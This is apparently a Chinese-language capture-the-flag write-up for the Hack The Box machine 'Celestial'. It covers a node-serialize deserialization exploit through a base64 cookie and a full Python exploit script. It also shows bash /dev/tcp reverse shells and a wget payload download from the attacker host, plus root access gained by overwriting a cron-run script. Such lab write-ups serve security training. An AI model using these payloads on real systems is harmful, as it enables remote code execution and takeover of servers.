# Celestial
- URL : https://app.hackthebox.eu/machines/130
- IP : 10.129.217.35
## Recon
- 掃 Port
    - `nmapAutomator.sh -H 10.129.217.35 -t recon`
    - ![](https://i.imgur.com/vZmyavd.png)
- 掃路徑
    - ![](https://i.imgur.com/hna0l1B.png)
- 首頁 404
    - ![](https://i.imgur.com/wAlHdP2.png)
- 發現有餅乾
    - ![](https://i.imgur.com/ocmsv5M.png)
- F5 後
    - ![](https://i.imgur.com/ELQeEWv.png)
    - 發現餅乾是 Serialize
## Serialize
```python
import requests
import base64

src = b'{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}'
dst = base64.b64encode(src).decode('ascii')
cookies = {
    'profile': dst
}

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'If-None-Match': 'W/"c-8lfvj2TmiRRvB7K+JPws1w9h6aY"',
    'Cache-Control': 'max-age=0',
}

response = requests.get('http://10.129.217.35:3000/', headers=headers, cookies=cookies)

print(response.text)
```
 亂戳 
```
{"username": "meow" ,"country":"Idk Probably Somewhere Dumb","city":"Lametown","num": true}
```
會回傳
```
Hey meow true + true is 2
```


戳
```
{"username": "meow" ,"country":"Idk Probably Somewhere Dumb","city":"Lametown","num": []}
```

會回傳
```
Hey meow  +  is undefined
```

戳
```
eval("A")
```

會噴錯
錯誤中有提到 
```
SyntaxError: Unexpected token e<br> &nbsp; &nbsp;at Object.parse (native)<br> &nbsp; &nbsp;at Object.exports.unserialize (/home/sun/node_modules/node-serialize/lib/serialize.js
```

- Google `node-serialize exploit`
- https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf

透過 IIFE 來達成 RCE

```
var y = {
    rce : function(){
    require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });
    },
   }

var serialize = require('node-serialize'); 
console.log("Serialized: \n" + serialize.serialize(y));
```

```
{"rce":"_$$ND_FUNC$$_function(){\n    require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });\n    }"}
```

```
var y = {
    rce : function(){
    require('child_process').exec('id', function(error, stdout, stderr) { console.log(stdout) });}(),
    username: "meow" ,
    country:"Idk Probably Somewhere Dumb",
    city :"Lametown",
    // num: 2,
   }

var serialize = require('node-serialize'); 
// console.log("Serialized: \n" + Buffer.from(serialize.serialize(y)).toString('base64'));

var s = serialize.serialize(y);

// console.log(s)

serialize.unserialize(s)

```
- 戳 Reverse shell
    - `bash -c 'bash -i >& /dev/tcp/10.10.16.35/7877 0>&1' `

## Exploit
- 完整 Payload
    - `src = """{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2","rce":"_$$ND_FUNC$$_function (){require('child_process').exec('wget 10.10.16.35', function(error, stdout, stderr) { console.log(stdout) });}()"}"""`


```python
import requests
import base64


cmd = "wget 10.10.16.35"
src = """{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2","rce":"_$$ND_FUNC$$_function (){require('child_process').exec('""" + cmd + """', function(error, stdout, stderr) { console.log(stdout) });}()"}"""
src = src.encode('ascii')

dst = base64.b64encode(src).decode('ascii')

cookies = {
    'profile': dst
}

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'If-None-Match': 'W/"c-8lfvj2TmiRRvB7K+JPws1w9h6aY"',
    'Cache-Control': 'max-age=0',
}

response = requests.get('http://10.129.217.35:3000/', headers=headers, cookies=cookies)

print(response.text)
```
- 就成功 RCE ㄌ
    - `wget 10.10.16.35/s_HTB -O /tmp/s`
    - 放 Reverse shell
- 戳回來
    - ![](https://i.imgur.com/KNdkFxD.png)
## 提權
- `python -c 'import pty; pty.spawn("/bin/bash")'`
- 發現家目錄有 `output.txt`
    - ![](https://i.imgur.com/uvKZeeo.png)
- 跑豌豆
    - ![](https://i.imgur.com/VrJv2p6.png)
    - ![](https://i.imgur.com/kG7e4jh.png)
        - 找到一個 Cronjob
- 觀察 `output.txt`
    - ![](https://i.imgur.com/vDyw6w4.png)
- 尋找 `Script is running 在哪`
    - `grep -rnw '/' -e 'Script is running...' 2>/dev/null`
    - ![](https://i.imgur.com/ZVbg62o.png)
- 找到 user flag
    - ![](https://i.imgur.com/R8u4ah3.png)
-  script 是 cron job 每5分鐘跑一次，且我們可以修改
    - ![](https://i.imgur.com/14Mt18a.png)
- 戳 reverse shell
    - `echo "import os" > script.py`
    - `echo "os.system(\"bash -c 'bash -i >& /dev/tcp/10.10.16.35/7878 0>&1'\")" >> script.py`
- 收 Reverse shell
    - ![](https://i.imgur.com/QhPAE7i.png)
    - ![](https://i.imgur.com/FA4Cldq.png)
